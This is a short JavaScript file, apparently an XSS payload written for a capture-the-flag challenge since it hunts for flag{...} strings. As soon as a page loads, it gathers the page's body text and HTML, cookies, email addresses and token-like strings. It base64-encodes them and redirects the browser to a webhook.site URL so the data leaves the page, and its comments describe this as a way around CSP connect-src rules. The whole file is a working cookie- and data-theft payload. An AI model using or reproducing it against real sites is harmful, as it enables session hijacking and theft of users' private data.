//redirect.js
// Simple DOM body exfiltration via window.location.replace
// Bypasses CSP connect-src restrictions

function exfiltrateBodyContent() {
    console.log('🚀 [REDIRECT] Starting DOM body exfiltration...');
    
    // Collect basic page data
    const pageData = {
        url: location.href,
        domain: location.hostname,
        title: document.title,
        bodyText: document.body.textContent.trim(),
        bodyHTML: document.body.innerHTML,
        cookies: document.cookie,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Look for sensitive patterns in body content
    const sensitivePatterns = {
        flags: document.body.textContent.match(/flag\{[^}]+\}/gi) || [],
        emails: document.body.textContent.match(/[\w\.-]+@[\w\.-]+\.\w+/gi) || [],
        tokens: document.body.textContent.match(/[a-zA-Z0-9_-]{20,}/g) || []
    };
    
    // Combine data
    const exfilData = {
        page: pageData,
        sensitive: sensitivePatterns
    };
    
    console.log('📊 [REDIRECT] Collected data:', exfilData);
    
    // Encode data for URL
    const encoded = btoa(JSON.stringify(exfilData));
    const redirectUrl = `https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/redirect-body?data=${encoded}`;
    
    console.log('🚨 [REDIRECT] WARNING: Redirecting page in 2 seconds...');
    console.log('📤 [REDIRECT] URL:', redirectUrl);
    
    // Brief delay for console logs
    setTimeout(() => {
        window.location.replace(redirectUrl);
    }, 2000);
}

// Auto-execute when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', exfiltrateBodyContent);
} else {
    exfiltrateBodyContent();
}

// Manual execution function
window.exfiltrateBody = exfiltrateBodyContent;